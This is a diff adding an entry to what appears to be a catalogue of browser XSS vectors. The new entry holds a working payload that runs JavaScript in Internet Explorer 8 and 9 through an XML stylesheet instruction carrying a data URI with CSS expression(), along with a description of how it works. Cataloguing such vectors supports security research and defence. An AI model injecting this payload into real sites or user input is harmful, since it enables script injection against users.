@@ -2569,5 +2569,34 @@ var items =
         },
         'tags'       : ['xss', 'javascript', 'xlinks', 'firefox', 'xml'],
         'reporter'   : 'LeverOne, .mario'
+    },
+    { /* ID 82 - JavaScript execution via XML stylesheet, data URI and expression() */
+        'id'         : 82,
+        'category'   : 'xml', 
+        'name'       : {
+            'en' : 'JavaScript execution via XML stylesheet, data URI and expression()',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>',
+        'description': {
+            'en' : 'Internet Explorer 8 and 9 support data URIs and thus are capable of including stylesheets this way. By using a xml stylesheet tag and a data URI containing an expression() it\'s possible to execute JavaScript without user interaction.',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'urls'    : ['http://www.w3.org/TR/xml-stylesheet/'],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'internet explorer': ['8.0', '9.0']
+        },
+        'tags'       : ['xss', 'javascript', 'xml stylesheet', 'css', 'internet explorer', 'expression',  'xml'],
+        'reporter'   : '.mario, LeverOne'
     }
 ]
